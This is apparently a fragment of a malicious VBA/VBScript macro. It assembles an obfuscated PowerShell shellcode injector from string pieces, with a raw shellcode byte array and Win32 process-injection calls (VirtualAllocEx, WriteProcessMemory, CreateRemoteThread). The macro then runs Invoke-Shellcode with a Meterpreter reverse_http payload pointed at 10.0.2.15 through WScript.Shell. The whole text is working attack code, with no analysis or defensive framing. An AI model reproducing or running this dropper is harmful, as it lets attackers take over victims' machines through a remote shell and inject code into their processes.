        VrOjTp = VrOjTp + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        VrOjTp = VrOjTp + "                        0x00,0x00,0x00,0x48,0x85,0"
        VrOjTp = VrOjTp + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        VrOjTp = VrOjTp + "x44,
                                  0x8b,0x40,0"
        VrOjTp = VrOjTp + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        VrOjTp = VrOjTp + "x8b,0x34,0x88,0x48,
                              "
        VrOjTp = VrOjTp + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        VrOjTp = VrOjTp + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        VrOjTp = VrOjTp + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        VrOjTp = VrOjTp + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        VrOjTp = VrOjTp + "                                  0x8b,0x40,0x24,0"
        VrOjTp = VrOjTp + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        VrOjTp = VrOjTp + "x40,0x1c,0x49,
                                  0"
        VrOjTp = VrOjTp + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        VrOjTp = VrOjTp + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        VrOjTp = VrOjTp + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        VrOjTp = VrOjTp + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        VrOjTp = VrOjTp + "                             0x59,0x5a,0x48,0x8b,0"
        VrOjTp = VrOjTp + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        VrOjTp = VrOjTp + "x00,0x00,
                                  0x00,0"
        VrOjTp = VrOjTp + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        VrOjTp = VrOjTp + "x00,0x41,0xba,0x31,0x8b,
                         "
        VrOjTp = VrOjTp + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        VrOjTp = VrOjTp + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        VrOjTp = VrOjTp + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        VrOjTp = VrOjTp + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        VrOjTp = VrOjTp + "x47,
                                  0x13,0x72,0"
        VrOjTp = VrOjTp + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        VrOjTp = VrOjTp + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        VrOjTp = VrOjTp + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        VrOjTp = VrOjTp + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        VrOjTp = VrOjTp + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        VrOjTp = VrOjTp + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        VrOjTp = VrOjTp + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        VrOjTp = VrOjTp + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        VrOjTp = VrOjTp + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        VrOjTp = VrOjTp + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        VrOjTp = VrOjTp + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        VrOjTp = VrOjTp + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        VrOjTp = VrOjTp + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        VrOjTp = VrOjTp + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        VrOjTp = VrOjTp + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        VrOjTp = VrOjTp + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        VrOjTp = VrOjTp + "ernel32.dll WriteProcessMemory
        $WriteProce"
        VrOjTp = VrOjTp + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        VrOjTp = VrOjTp + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        VrOjTp = VrOjTp + "()) ([Bool])
        $WriteProcessMemory = [System"
        VrOjTp = VrOjTp + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        VrOjTp = VrOjTp + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        VrOjTp = VrOjTp + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        VrOjTp = VrOjTp + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        VrOjTp = VrOjTp + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        VrOjTp = VrOjTp + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        VrOjTp = VrOjTp + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        VrOjTp = VrOjTp + "eateRemoteThread = [System.Runtime.InteropServices"
        VrOjTp = VrOjTp + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        VrOjTp = VrOjTp + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        VrOjTp = VrOjTp + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        VrOjTp = VrOjTp + " CloseHandle
        $CloseHandleDelegate = Get-De"
        VrOjTp = VrOjTp + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        VrOjTp = VrOjTp + "le = [System.Runtime.InteropServices.Marshal]::Get"
        VrOjTp = VrOjTp + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        VrOjTp = VrOjTp + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        VrOjTp = VrOjTp + ".ShouldContinue( 'Do you wish to carry out your ev"
        VrOjTp = VrOjTp + "il plans?',
                 "Injecting shellcode "
        VrOjTp = VrOjTp + "injecting into $((Get-Process -Id $ProcessId).Proc"
        VrOjTp = VrOjTp + "essName) ($ProcessId)!" ) )
        {
            "
        VrOjTp = VrOjTp + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        VrOjTp = VrOjTp + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        VrOjTp = VrOjTp + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        VrOjTp = VrOjTp + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        VrOjTp = VrOjTp + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        VrOjTp = VrOjTp + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        VrOjTp = VrOjTp + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        VrOjTp = VrOjTp + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        VrOjTp = VrOjTp + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        VrOjTp = VrOjTp + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        VrOjTp = VrOjTp + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        VrOjTp = VrOjTp + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        VrOjTp = VrOjTp + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        VrOjTp = VrOjTp + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        VrOjTp = VrOjTp + "rocAddress kernel32.dll CreateThread
        $Crea"
        VrOjTp = VrOjTp + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        VrOjTp = VrOjTp + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        VrOjTp = VrOjTp + "IntPtr])
        $CreateThread = [System.Runtime.I"
        VrOjTp = VrOjTp + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        VrOjTp = VrOjTp + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        VrOjTp = VrOjTp + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        VrOjTp = VrOjTp + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        VrOjTp = VrOjTp + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        VrOjTp = VrOjTp + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        VrOjTp = VrOjTp + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        VrOjTp = VrOjTp + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        VrOjTp = VrOjTp + "ForSingleObjectDelegate)
        if ( $Force -or $"
        VrOjTp = VrOjTp + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        VrOjTp = VrOjTp + " your evil plans?',
                 "Injecting sh"
        VrOjTp = VrOjTp + "ellcode into the running PowerShell process!" ) )
"
        VrOjTp = VrOjTp + "        {
            Inject-LocalShellcode
      "
        VrOjTp = VrOjTp + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        VrOjTp = VrOjTp + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        VrOjTp = VrOjTp + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(VrOjTp)
End Function
